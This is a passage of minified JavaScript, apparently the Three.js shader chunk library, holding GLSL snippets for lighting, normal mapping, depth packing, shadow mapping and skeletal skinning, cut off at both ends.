] ) : 1.0;\n\t\t#endif\n\n\t\tRE_Direct( directLight, geometry, material, reflectedLight );\n\n\t}\n\n#endif\n\n#if ( NUM_RECT_AREA_LIGHTS > 0 ) && defined( RE_Direct_RectArea )\n\n\tRectAreaLight rectAreaLight;\n\n\t#pragma unroll_loop\n\tfor ( int i = 0; i < NUM_RECT_AREA_LIGHTS; i ++ ) {\n\n\t\trectAreaLight = rectAreaLights[ i ];\n\t\tRE_Direct_RectArea( rectAreaLight, geometry, material, reflectedLight );\n\n\t}\n\n#endif\n\n#if defined( RE_IndirectDiffuse )\n\n\tvec3 irradiance = getAmbientLightIrradiance( ambientLightColor );\n\n\t#if ( NUM_HEMI_LIGHTS > 0 )\n\n\t\t#pragma unroll_loop\n\t\tfor ( int i = 0; i < NUM_HEMI_LIGHTS; i ++ ) {\n\n\t\t\tirradiance += getHemisphereLightIrradiance( hemisphereLights[ i ], geometry );\n\n\t\t}\n\n\t#endif\n\n#endif\n\n#if defined( RE_IndirectSpecular )\n\n\tvec3 radiance = vec3( 0.0 );\n\tvec3 clearCoatRadiance = vec3( 0.0 );\n\n#endif\n",lights_fragment_maps:"\n#if defined( RE_IndirectDiffuse )\n\n\t#ifdef USE_LIGHTMAP\n\n\t\tvec3 lightMapIrradiance = texture2D( lightMap, vUv2 ).xyz * lightMapIntensity;\n\n\t\t#ifndef PHYSICALLY_CORRECT_LIGHTS\n\n\t\t\tlightMapIrradiance *= PI; // factor of PI should not be present; included here to prevent breakage\n\n\t\t#endif\n\n\t\tirradiance += lightMapIrradiance;\n\n\t#endif\n\n\t#if defined( USE_ENVMAP ) && defined( PHYSICAL ) && defined( ENVMAP_TYPE_CUBE_UV )\n\n\t\tirradiance += getLightProbeIndirectIrradiance(  geometry, maxMipLevel );\n\n\t#endif\n\n#endif\n\n#if defined( USE_ENVMAP ) && defined( RE_IndirectSpecular )\n\n\tradiance += getLightProbeIndirectRadiance(  geometry, Material_BlinnShininessExponent( material ), maxMipLevel );\n\n\t#ifndef STANDARD\n\t\tclearCoatRadiance += getLightProbeIndirectRadiance(  geometry, Material_ClearCoat_BlinnShininessExponent( material ), maxMipLevel );\n\t#endif\n\n#endif\n",lights_fragment_end:"\n#if defined( RE_IndirectDiffuse )\n\n\tRE_IndirectDiffuse( irradiance, geometry, material, reflectedLight );\n\n#endif\n\n#if defined( RE_IndirectSpecular )\n\n\tRE_IndirectSpecular( radiance, irradiance, clearCoatRadiance, geometry, material, reflectedLight );\n\n#endif\n",logdepthbuf_fragment:"\n#if defined( USE_LOGDEPTHBUF ) && defined( USE_LOGDEPTHBUF_EXT )\n\n\tgl_FragDepthEXT = log2( vFragDepth ) * logDepthBufFC * 0.5;\n\n#endif\n",logdepthbuf_pars_fragment:"\n#if defined( USE_LOGDEPTHBUF ) && defined( USE_LOGDEPTHBUF_EXT )\n\n\tuniform float logDepthBufFC;\n\tvarying float vFragDepth;\n\n#endif\n",logdepthbuf_pars_vertex:"\n#ifdef USE_LOGDEPTHBUF\n\n\t#ifdef USE_LOGDEPTHBUF_EXT\n\n\t\tvarying float vFragDepth;\n\n\t#else\n\n\t\tuniform float logDepthBufFC;\n\n\t#endif\n\n#endif\n",logdepthbuf_vertex:"\n#ifdef USE_LOGDEPTHBUF\n\n\t#ifdef USE_LOGDEPTHBUF_EXT\n\n\t\tvFragDepth = 1.0 + gl_Position.w;\n\n\t#else\n\n\t\tgl_Position.z = log2( max( EPSILON, gl_Position.w + 1.0 ) ) * logDepthBufFC - 1.0;\n\n\t\tgl_Position.z *= gl_Position.w;\n\n\t#endif\n\n#endif\n",map_fragment:"\n#ifdef USE_MAP\n\n\tvec4 texelColor = texture2D( map, vUv );\n\n\ttexelColor = mapTexelToLinear( texelColor );\n\tdiffuseColor *= texelColor;\n\n#endif\n",map_pars_fragment:"\n#ifdef USE_MAP\n\n\tuniform sampler2D map;\n\n#endif\n",map_particle_fragment:"\n#ifdef USE_MAP\n\n\tvec2 uv = ( uvTransform * vec3( gl_PointCoord.x, 1.0 - gl_PointCoord.y, 1 ) ).xy;\n\tvec4 mapTexel = texture2D( map, uv );\n\tdiffuseColor *= mapTexelToLinear( mapTexel );\n\n#endif\n",map_particle_pars_fragment:"\n#ifdef USE_MAP\n\n\tuniform mat3 uvTransform;\n\tuniform sampler2D map;\n\n#endif\n",metalnessmap_fragment:"\nfloat metalnessFactor = metalness;\n\n#ifdef USE_METALNESSMAP\n\n\tvec4 texelMetalness = texture2D( metalnessMap, vUv );\n\n\t// reads channel B, compatible with a combined OcclusionRoughnessMetallic (RGB) texture\n\tmetalnessFactor *= texelMetalness.b;\n\n#endif\n",metalnessmap_pars_fragment:"\n#ifdef USE_METALNESSMAP\n\n\tuniform sampler2D metalnessMap;\n\n#endif\n",morphnormal_vertex:"\n#ifdef USE_MORPHNORMALS\n\n\tobjectNormal += ( morphNormal0 - normal ) * morphTargetInfluences[ 0 ];\n\tobjectNormal += ( morphNormal1 - normal ) * morphTargetInfluences[ 1 ];\n\tobjectNormal += ( morphNormal2 - normal ) * morphTargetInfluences[ 2 ];\n\tobjectNormal += ( morphNormal3 - normal ) * morphTargetInfluences[ 3 ];\n\n#endif\n",morphtarget_pars_vertex:"\n#ifdef USE_MORPHTARGETS\n\n\t#ifndef USE_MORPHNORMALS\n\n\tuniform float morphTargetInfluences[ 8 ];\n\n\t#else\n\n\tuniform float morphTargetInfluences[ 4 ];\n\n\t#endif\n\n#endif\n",morphtarget_vertex:"\n#ifdef USE_MORPHTARGETS\n\n\ttransformed += ( morphTarget0 - position ) * morphTargetInfluences[ 0 ];\n\ttransformed += ( morphTarget1 - position ) * morphTargetInfluences[ 1 ];\n\ttransformed += ( morphTarget2 - position ) * morphTargetInfluences[ 2 ];\n\ttransformed += ( morphTarget3 - position ) * morphTargetInfluences[ 3 ];\n\n\t#ifndef USE_MORPHNORMALS\n\n\ttransformed += ( morphTarget4 - position ) * morphTargetInfluences[ 4 ];\n\ttransformed += ( morphTarget5 - position ) * morphTargetInfluences[ 5 ];\n\ttransformed += ( morphTarget6 - position ) * morphTargetInfluences[ 6 ];\n\ttransformed += ( morphTarget7 - position ) * morphTargetInfluences[ 7 ];\n\n\t#endif\n\n#endif\n",normal_fragment_begin:"\n#ifdef FLAT_SHADED\n\n\t// Workaround for Adreno/Nexus5 not able able to do dFdx( vViewPosition ) ...\n\n\tvec3 fdx = vec3( dFdx( vViewPosition.x ), dFdx( vViewPosition.y ), dFdx( vViewPosition.z ) );\n\tvec3 fdy = vec3( dFdy( vViewPosition.x ), dFdy( vViewPosition.y ), dFdy( vViewPosition.z ) );\n\tvec3 normal = normalize( cross( fdx, fdy ) );\n\n#else\n\n\tvec3 normal = normalize( vNormal );\n\n\t#ifdef DOUBLE_SIDED\n\n\t\tnormal = normal * ( float( gl_FrontFacing ) * 2.0 - 1.0 );\n\n\t#endif\n\n\t#ifdef USE_TANGENT\n\n\t\tvec3 tangent = normalize( vTangent );\n\t\tvec3 bitangent = normalize( vBitangent );\n\n\t\t#ifdef DOUBLE_SIDED\n\n\t\t\ttangent = tangent * ( float( gl_FrontFacing ) * 2.0 - 1.0 );\n\t\t\tbitangent = bitangent * ( float( gl_FrontFacing ) * 2.0 - 1.0 );\n\n\t\t#endif\n\n\t#endif\n\n#endif\n",normal_fragment_maps:"\n#ifdef USE_NORMALMAP\n\n\t#ifdef OBJECTSPACE_NORMALMAP\n\n\t\tnormal = texture2D( normalMap, vUv ).xyz * 2.0 - 1.0; // overrides both flatShading and attribute normals\n\n\t\t#ifdef FLIP_SIDED\n\n\t\t\tnormal = - normal;\n\n\t\t#endif\n\n\t\t#ifdef DOUBLE_SIDED\n\n\t\t\tnormal = normal * ( float( gl_FrontFacing ) * 2.0 - 1.0 );\n\n\t\t#endif\n\n\t\tnormal = normalize( normalMatrix * normal );\n\n\t#else // tangent-space normal map\n\n\t\t#ifdef USE_TANGENT\n\n\t\t\tmat3 vTBN = mat3( tangent, bitangent, normal );\n\t\t\tvec3 mapN = texture2D( normalMap, vUv ).xyz * 2.0 - 1.0;\n\t\t\tmapN.xy = normalScale * mapN.xy;\n\t\t\tnormal = normalize( vTBN * mapN );\n\n\t\t#else\n\n\t\t\tnormal = perturbNormal2Arb( -vViewPosition, normal );\n\n\t\t#endif\n\n\t#endif\n\n#elif defined( USE_BUMPMAP )\n\n\tnormal = perturbNormalArb( -vViewPosition, normal, dHdxy_fwd() );\n\n#endif\n",normalmap_pars_fragment:"\n#ifdef USE_NORMALMAP\n\n\tuniform sampler2D normalMap;\n\tuniform vec2 normalScale;\n\n\t#ifdef OBJECTSPACE_NORMALMAP\n\n\t\tuniform mat3 normalMatrix;\n\n\t#else\n\n\t\t// Per-Pixel Tangent Space Normal Mapping\n\t\t// http://hacksoflife.blogspot.ch/2009/11/per-pixel-tangent-space-normal-mapping.html\n\n\t\tvec3 perturbNormal2Arb( vec3 eye_pos, vec3 surf_norm ) {\n\n\t\t\t// Workaround for Adreno 3XX dFd*( vec3 ) bug. See #9988\n\n\t\t\tvec3 q0 = vec3( dFdx( eye_pos.x ), dFdx( eye_pos.y ), dFdx( eye_pos.z ) );\n\t\t\tvec3 q1 = vec3( dFdy( eye_pos.x ), dFdy( eye_pos.y ), dFdy( eye_pos.z ) );\n\t\t\tvec2 st0 = dFdx( vUv.st );\n\t\t\tvec2 st1 = dFdy( vUv.st );\n\n\t\t\tfloat scale = sign( st1.t * st0.s - st0.t * st1.s ); // we do not care about the magnitude\n\n\t\t\tvec3 S = normalize( ( q0 * st1.t - q1 * st0.t ) * scale );\n\t\t\tvec3 T = normalize( ( - q0 * st1.s + q1 * st0.s ) * scale );\n\t\t\tvec3 N = normalize( surf_norm );\n\t\t\tmat3 tsn = mat3( S, T, N );\n\n\t\t\tvec3 mapN = texture2D( normalMap, vUv ).xyz * 2.0 - 1.0;\n\n\t\t\tmapN.xy *= normalScale;\n\t\t\tmapN.xy *= ( float( gl_FrontFacing ) * 2.0 - 1.0 );\n\n\t\t\treturn normalize( tsn * mapN );\n\n\t\t}\n\n\t#endif\n\n#endif\n",packing:"\nvec3 packNormalToRGB( const in vec3 normal ) {\n\treturn normalize( normal ) * 0.5 + 0.5;\n}\n\nvec3 unpackRGBToNormal( const in vec3 rgb ) {\n\treturn 2.0 * rgb.xyz - 1.0;\n}\n\nconst float PackUpscale = 256. / 255.; // fraction -> 0..1 (including 1)\nconst float UnpackDownscale = 255. / 256.; // 0..1 -> fraction (excluding 1)\n\nconst vec3 PackFactors = vec3( 256. * 256. * 256., 256. * 256.,  256. );\nconst vec4 UnpackFactors = UnpackDownscale / vec4( PackFactors, 1. );\n\nconst float ShiftRight8 = 1. / 256.;\n\nvec4 packDepthToRGBA( const in float v ) {\n\tvec4 r = vec4( fract( v * PackFactors ), v );\n\tr.yzw -= r.xyz * ShiftRight8; // tidy overflow\n\treturn r * PackUpscale;\n}\n\nfloat unpackRGBAToDepth( const in vec4 v ) {\n\treturn dot( v, UnpackFactors );\n}\n\n// NOTE: viewZ/eyeZ is < 0 when in front of the camera per OpenGL conventions\n\nfloat viewZToOrthographicDepth( const in float viewZ, const in float near, const in float far ) {\n\treturn ( viewZ + near ) / ( near - far );\n}\nfloat orthographicDepthToViewZ( const in float linearClipZ, const in float near, const in float far ) {\n\treturn linearClipZ * ( near - far ) - near;\n}\n\nfloat viewZToPerspectiveDepth( const in float viewZ, const in float near, const in float far ) {\n\treturn (( near + viewZ ) * far ) / (( far - near ) * viewZ );\n}\nfloat perspectiveDepthToViewZ( const in float invClipZ, const in float near, const in float far ) {\n\treturn ( near * far ) / ( ( far - near ) * invClipZ - far );\n}\n",premultiplied_alpha_fragment:"\n#ifdef PREMULTIPLIED_ALPHA\n\n\t// Get get normal blending with premultipled, use with CustomBlending, OneFactor, OneMinusSrcAlphaFactor, AddEquation.\n\tgl_FragColor.rgb *= gl_FragColor.a;\n\n#endif\n",project_vertex:"\nvec4 mvPosition = modelViewMatrix * vec4( transformed, 1.0 );\n\ngl_Position = projectionMatrix * mvPosition;\n",dithering_fragment:"\n#if defined( DITHERING )\n\n\tgl_FragColor.rgb = dithering( gl_FragColor.rgb );\n\n#endif\n",dithering_pars_fragment:"\n#if defined( DITHERING )\n\n\t// based on https://www.shadertoy.com/view/MslGR8\n\tvec3 dithering( vec3 color ) {\n\t\t//Calculate grid position\n\t\tfloat grid_position = rand( gl_FragCoord.xy );\n\n\t\t//Shift the individual colors differently, thus making it even harder to see the dithering pattern\n\t\tvec3 dither_shift_RGB = vec3( 0.25 / 255.0, -0.25 / 255.0, 0.25 / 255.0 );\n\n\t\t//modify shift acording to grid position.\n\t\tdither_shift_RGB = mix( 2.0 * dither_shift_RGB, -2.0 * dither_shift_RGB, grid_position );\n\n\t\t//shift the color by dither_shift\n\t\treturn color + dither_shift_RGB;\n\t}\n\n#endif\n",roughnessmap_fragment:"\nfloat roughnessFactor = roughness;\n\n#ifdef USE_ROUGHNESSMAP\n\n\tvec4 texelRoughness = texture2D( roughnessMap, vUv );\n\n\t// reads channel G, compatible with a combined OcclusionRoughnessMetallic (RGB) texture\n\troughnessFactor *= texelRoughness.g;\n\n#endif\n",roughnessmap_pars_fragment:"\n#ifdef USE_ROUGHNESSMAP\n\n\tuniform sampler2D roughnessMap;\n\n#endif\n",shadowmap_pars_fragment:"\n#ifdef USE_SHADOWMAP\n\n\t#if NUM_DIR_LIGHTS > 0\n\n\t\tuniform sampler2D directionalShadowMap[ NUM_DIR_LIGHTS ];\n\t\tvarying vec4 vDirectionalShadowCoord[ NUM_DIR_LIGHTS ];\n\n\t#endif\n\n\t#if NUM_SPOT_LIGHTS > 0\n\n\t\tuniform sampler2D spotShadowMap[ NUM_SPOT_LIGHTS ];\n\t\tvarying vec4 vSpotShadowCoord[ NUM_SPOT_LIGHTS ];\n\n\t#endif\n\n\t#if NUM_POINT_LIGHTS > 0\n\n\t\tuniform sampler2D pointShadowMap[ NUM_POINT_LIGHTS ];\n\t\tvarying vec4 vPointShadowCoord[ NUM_POINT_LIGHTS ];\n\n\t#endif\n\tfloat texture2DCompare( sampler2D depths, vec2 uv, float compare ) {\n\n\t\treturn step( compare, unpackRGBAToDepth( texture2D( depths, uv ) ) );\n\n\t}\n\n\tfloat texture2DShadowLerp( sampler2D depths, vec2 size, vec2 uv, float compare ) {\n\n\t\tconst vec2 offset = vec2( 0.0, 1.0 );\n\n\t\tvec2 texelSize = vec2( 1.0 ) / size;\n\t\tvec2 centroidUV = floor( uv * size + 0.5 ) / size;\n\n\t\tfloat lb = texture2DCompare( depths, centroidUV + texelSize * offset.xx, compare );\n\t\tfloat lt = texture2DCompare( depths, centroidUV + texelSize * offset.xy, compare );\n\t\tfloat rb = texture2DCompare( depths, centroidUV + texelSize * offset.yx, compare );\n\t\tfloat rt = texture2DCompare( depths, centroidUV + texelSize * offset.yy, compare );\n\n\t\tvec2 f = fract( uv * size + 0.5 );\n\n\t\tfloat a = mix( lb, lt, f.y );\n\t\tfloat b = mix( rb, rt, f.y );\n\t\tfloat c = mix( a, b, f.x );\n\n\t\treturn c;\n\n\t}\n\n\tfloat getShadow( sampler2D shadowMap, vec2 shadowMapSize, float shadowBias, float shadowRadius, vec4 shadowCoord ) {\n\n\t\tfloat shadow = 1.0;\n\n\t\tshadowCoord.xyz /= shadowCoord.w;\n\t\tshadowCoord.z += shadowBias;\n\n\t\t// if ( something && something ) breaks ATI OpenGL shader compiler\n\t\t// if ( all( something, something ) ) using this instead\n\n\t\tbvec4 inFrustumVec = bvec4 ( shadowCoord.x >= 0.0, shadowCoord.x <= 1.0, shadowCoord.y >= 0.0, shadowCoord.y <= 1.0 );\n\t\tbool inFrustum = all( inFrustumVec );\n\n\t\tbvec2 frustumTestVec = bvec2( inFrustum, shadowCoord.z <= 1.0 );\n\n\t\tbool frustumTest = all( frustumTestVec );\n\n\t\tif ( frustumTest ) {\n\n\t\t#if defined( SHADOWMAP_TYPE_PCF )\n\n\t\t\tvec2 texelSize = vec2( 1.0 ) / shadowMapSize;\n\n\t\t\tfloat dx0 = - texelSize.x * shadowRadius;\n\t\t\tfloat dy0 = - texelSize.y * shadowRadius;\n\t\t\tfloat dx1 = + texelSize.x * shadowRadius;\n\t\t\tfloat dy1 = + texelSize.y * shadowRadius;\n\n\t\t\tshadow = (\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx0, dy0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( 0.0, dy0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx1, dy0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx0, 0.0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy, shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx1, 0.0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx0, dy1 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( 0.0, dy1 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx1, dy1 ), shadowCoord.z )\n\t\t\t) * ( 1.0 / 9.0 );\n\n\t\t#elif defined( SHADOWMAP_TYPE_PCF_SOFT )\n\n\t\t\tvec2 texelSize = vec2( 1.0 ) / shadowMapSize;\n\n\t\t\tfloat dx0 = - texelSize.x * shadowRadius;\n\t\t\tfloat dy0 = - texelSize.y * shadowRadius;\n\t\t\tfloat dx1 = + texelSize.x * shadowRadius;\n\t\t\tfloat dy1 = + texelSize.y * shadowRadius;\n\n\t\t\tshadow = (\n\t\t\t\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx0, dy0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( 0.0, dy0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx1, dy0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx0, 0.0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy, shadowCoord.z ) +\n\t\t\t\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx1, 0.0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx0, dy1 ), shadowCoord.z ) +\n\t\t\t\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( 0.0, dy1 ), shadowCoord.z ) +\n\t\t\t\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx1, dy1 ), shadowCoord.z )\n\t\t\t) * ( 1.0 / 9.0 );\n\n\t\t#else // no percentage-closer filtering:\n\n\t\t\tshadow = texture2DCompare( shadowMap, shadowCoord.xy, shadowCoord.z );\n\n\t\t#endif\n\n\t\t}\n\n\t\treturn shadow;\n\n\t}\n\n\t// cubeToUV() maps a 3D direction vector suitable for cube texture mapping to a 2D\n\t// vector suitable for 2D texture mapping. This code uses the following layout for the\n\t// 2D texture:\n\t//\n\t// xzXZ\n\t//  y Y\n\t//\n\t// Y - Positive y direction\n\t// y - Negative y direction\n\t// X - Positive x direction\n\t// x - Negative x direction\n\t// Z - Positive z direction\n\t// z - Negative z direction\n\t//\n\t// Source and test bed:\n\t// https://gist.github.com/tschw/da10c43c467ce8afd0c4\n\n\tvec2 cubeToUV( vec3 v, float texelSizeY ) {\n\n\t\t// Number of texels to avoid at the edge of each square\n\n\t\tvec3 absV = abs( v );\n\n\t\t// Intersect unit cube\n\n\t\tfloat scaleToCube = 1.0 / max( absV.x, max( absV.y, absV.z ) );\n\t\tabsV *= scaleToCube;\n\n\t\t// Apply scale to avoid seams\n\n\t\t// two texels less per square (one texel will do for NEAREST)\n\t\tv *= scaleToCube * ( 1.0 - 2.0 * texelSizeY );\n\n\t\t// Unwrap\n\n\t\t// space: -1 ... 1 range for each square\n\t\t//\n\t\t// #X##\t\tdim    := ( 4 , 2 )\n\t\t//  # #\t\tcenter := ( 1 , 1 )\n\n\t\tvec2 planar = v.xy;\n\n\t\tfloat almostATexel = 1.5 * texelSizeY;\n\t\tfloat almostOne = 1.0 - almostATexel;\n\n\t\tif ( absV.z >= almostOne ) {\n\n\t\t\tif ( v.z > 0.0 )\n\t\t\t\tplanar.x = 4.0 - v.x;\n\n\t\t} else if ( absV.x >= almostOne ) {\n\n\t\t\tfloat signX = sign( v.x );\n\t\t\tplanar.x = v.z * signX + 2.0 * signX;\n\n\t\t} else if ( absV.y >= almostOne ) {\n\n\t\t\tfloat signY = sign( v.y );\n\t\t\tplanar.x = v.x + 2.0 * signY + 2.0;\n\t\t\tplanar.y = v.z * signY - 2.0;\n\n\t\t}\n\n\t\t// Transform to UV space\n\n\t\t// scale := 0.5 / dim\n\t\t// translate := ( center + 0.5 ) / dim\n\t\treturn vec2( 0.125, 0.25 ) * planar + vec2( 0.375, 0.75 );\n\n\t}\n\n\tfloat getPointShadow( sampler2D shadowMap, vec2 shadowMapSize, float shadowBias, float shadowRadius, vec4 shadowCoord, float shadowCameraNear, float shadowCameraFar ) {\n\n\t\tvec2 texelSize = vec2( 1.0 ) / ( shadowMapSize * vec2( 4.0, 2.0 ) );\n\n\t\t// for point lights, the uniform @vShadowCoord is re-purposed to hold\n\t\t// the vector from the light to the world-space position of the fragment.\n\t\tvec3 lightToPosition = shadowCoord.xyz;\n\n\t\t// dp = normalized distance from light to fragment position\n\t\tfloat dp = ( length( lightToPosition ) - shadowCameraNear ) / ( shadowCameraFar - shadowCameraNear ); // need to clamp?\n\t\tdp += shadowBias;\n\n\t\t// bd3D = base direction 3D\n\t\tvec3 bd3D = normalize( lightToPosition );\n\n\t\t#if defined( SHADOWMAP_TYPE_PCF ) || defined( SHADOWMAP_TYPE_PCF_SOFT )\n\n\t\t\tvec2 offset = vec2( - 1, 1 ) * shadowRadius * texelSize.y;\n\n\t\t\treturn (\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xyy, texelSize.y ), dp ) +\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yyy, texelSize.y ), dp ) +\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xyx, texelSize.y ), dp ) +\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yyx, texelSize.y ), dp ) +\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D, texelSize.y ), dp ) +\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xxy, texelSize.y ), dp ) +\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yxy, texelSize.y ), dp ) +\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xxx, texelSize.y ), dp ) +\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yxx, texelSize.y ), dp )\n\t\t\t) * ( 1.0 / 9.0 );\n\n\t\t#else // no percentage-closer filtering\n\n\t\t\treturn texture2DCompare( shadowMap, cubeToUV( bd3D, texelSize.y ), dp );\n\n\t\t#endif\n\n\t}\n\n#endif\n",shadowmap_pars_vertex:"\n#ifdef USE_SHADOWMAP\n\n\t#if NUM_DIR_LIGHTS > 0\n\n\t\tuniform mat4 directionalShadowMatrix[ NUM_DIR_LIGHTS ];\n\t\tvarying vec4 vDirectionalShadowCoord[ NUM_DIR_LIGHTS ];\n\n\t#endif\n\n\t#if NUM_SPOT_LIGHTS > 0\n\n\t\tuniform mat4 spotShadowMatrix[ NUM_SPOT_LIGHTS ];\n\t\tvarying vec4 vSpotShadowCoord[ NUM_SPOT_LIGHTS ];\n\n\t#endif\n\n\t#if NUM_POINT_LIGHTS > 0\n\n\t\tuniform mat4 pointShadowMatrix[ NUM_POINT_LIGHTS ];\n\t\tvarying vec4 vPointShadowCoord[ NUM_POINT_LIGHTS ];\n\n\t#endif\n#endif\n",shadowmap_vertex:"\n#ifdef USE_SHADOWMAP\n\n\t#if NUM_DIR_LIGHTS > 0\n\n\t#pragma unroll_loop\n\tfor ( int i = 0; i < NUM_DIR_LIGHTS; i ++ ) {\n\n\t\tvDirectionalShadowCoord[ i ] = directionalShadowMatrix[ i ] * worldPosition;\n\n\t}\n\n\t#endif\n\n\t#if NUM_SPOT_LIGHTS > 0\n\n\t#pragma unroll_loop\n\tfor ( int i = 0; i < NUM_SPOT_LIGHTS; i ++ ) {\n\n\t\tvSpotShadowCoord[ i ] = spotShadowMatrix[ i ] * worldPosition;\n\n\t}\n\n\t#endif\n\n\t#if NUM_POINT_LIGHTS > 0\n\n\t#pragma unroll_loop\n\tfor ( int i = 0; i < NUM_POINT_LIGHTS; i ++ ) {\n\n\t\tvPointShadowCoord[ i ] = pointShadowMatrix[ i ] * worldPosition;\n\n\t}\n\n\t#endif\n#endif\n",shadowmask_pars_fragment:"\nfloat getShadowMask() {\n\n\tfloat shadow = 1.0;\n\n\t#ifdef USE_SHADOWMAP\n\n\t#if NUM_DIR_LIGHTS > 0\n\n\tDirectionalLight directionalLight;\n\n\t#pragma unroll_loop\n\tfor ( int i = 0; i < NUM_DIR_LIGHTS; i ++ ) {\n\n\t\tdirectionalLight = directionalLights[ i ];\n\t\tshadow *= bool( directionalLight.shadow ) ? getShadow( directionalShadowMap[ i ], directionalLight.shadowMapSize, directionalLight.shadowBias, directionalLight.shadowRadius, vDirectionalShadowCoord[ i ] ) : 1.0;\n\n\t}\n\n\t#endif\n\n\t#if NUM_SPOT_LIGHTS > 0\n\n\tSpotLight spotLight;\n\n\t#pragma unroll_loop\n\tfor ( int i = 0; i < NUM_SPOT_LIGHTS; i ++ ) {\n\n\t\tspotLight = spotLights[ i ];\n\t\tshadow *= bool( spotLight.shadow ) ? getShadow( spotShadowMap[ i ], spotLight.shadowMapSize, spotLight.shadowBias, spotLight.shadowRadius, vSpotShadowCoord[ i ] ) : 1.0;\n\n\t}\n\n\t#endif\n\n\t#if NUM_POINT_LIGHTS > 0\n\n\tPointLight pointLight;\n\n\t#pragma unroll_loop\n\tfor ( int i = 0; i < NUM_POINT_LIGHTS; i ++ ) {\n\n\t\tpointLight = pointLights[ i ];\n\t\tshadow *= bool( pointLight.shadow ) ? getPointShadow( pointShadowMap[ i ], pointLight.shadowMapSize, pointLight.shadowBias, pointLight.shadowRadius, vPointShadowCoord[ i ], pointLight.shadowCameraNear, pointLight.shadowCameraFar ) : 1.0;\n\n\t}\n\n\t#endif\n\t#endif\n\n\treturn shadow;\n\n}\n",skinbase_vertex:"\n#ifdef USE_SKINNING\n\n\tmat4 boneMatX = getBoneMatrix( skinIndex.x );\n\tmat4 boneMatY = getBoneMatrix( skinIndex.y );\n\tmat4 boneMatZ = getBoneMatrix( skinIndex.z );\n\tmat4 boneMatW = getBoneMatrix( skinIndex.w );\n\n#endif\n",skinning_pars_vertex:"\n#ifdef USE_SKINNING\n\n\tuniform mat4 bindMatrix;\n\tuniform mat4 bindMatrixInverse;\n\n\t#ifdef BONE_TEXTURE\n\n\t\tuniform sampler2D boneTexture;\n\t\tuniform int boneTextureSize;\n\n\t\tmat4 getBoneMatrix( const in float i ) {\n\n\t\t\tfloat j = i * 4.0;\n\t\t\tfloat x = mod( j, float( boneTextureSize ) );\n\t\t\tfloat y = floor( j / float( boneTextureSize ) );\n\n\t\t\tfloat dx = 1.0 / float( boneTextureSize );\n\t\t\tfloat dy = 1.0 / float( boneTextureSize );\n\n\t\t\ty = dy * ( y + 0.5 );\n\n\t\t\tvec4 v1 = texture2D( boneTexture, vec2( dx * ( x + 0.5 ), y ) );\n\t\t\tvec4 v2 = texture2D( boneTexture, vec2( dx * ( x + 1.5 ), y ) );\n\t\t\tvec4 v3 = texture2D( boneTexture, vec2( dx * ( x + 2.5 ), y ) );\n\t\t\tvec4 v4 = texture2D( boneTexture, vec2( dx * ( x + 3.5 ), y ) );\n\n\t\t\tmat4 bone = mat4( v1, v2, v3, v4 );\n\n\t\t\treturn bone;\n\n\t\t}\n\n\t#else\n\n\t\tuniform mat4 boneMatrices[ MAX_BONES ];\n\n\t\tmat4 getBoneMatrix( const in float i ) {\n\n\t\t\tmat4 bone = boneMatrices[ int(i) ];\n\t\t\treturn bone;\n\n\t\t}\n\n\t#endif\n\n#endif\n",skinning_vertex:"\n#ifdef USE_SKINNING\n\n\tvec4 skinVertex = bindMatrix * vec4( transformed, 1.0 );\n\n\tvec4 skinned = vec4( 0.0 );\n\tskinned += boneMatX * skinVertex * skinWeight.x;\n\tskinned += boneMatY * skinVertex * skinWeight.y;\n\tskinned += boneMatZ * skinVertex * skinWeight.z;\n\tskinned += boneMatW * skinVertex * skinWeight.w;\n\n\ttransformed = ( bindMatrixInverse * skinned ).xyz;\n\n#endif\n",skinnormal_vertex:"\n#ifdef USE_SKINNING\n\n\tmat4 skinMatrix = mat4( 0.0 );\n\tskinMatrix += skinWeight.x * boneMatX;\n\tskinMatrix += skinWeight.y * boneMatY;\n\tskinMatrix += skinWeight.z * boneMatZ;\n\tskinMatrix += skinWeight.w * boneMatW;\n\tskinMatrix  = bindMatrixInverse * skinMatrix * bindMatrix;\n\n\tobjectNormal = vec4( skinMatrix * vec4( objectNormal, 0.0 ) ).xyz;\n\n\t#ifdef USE_TANGENT\n\n\t\tobjectTangent = 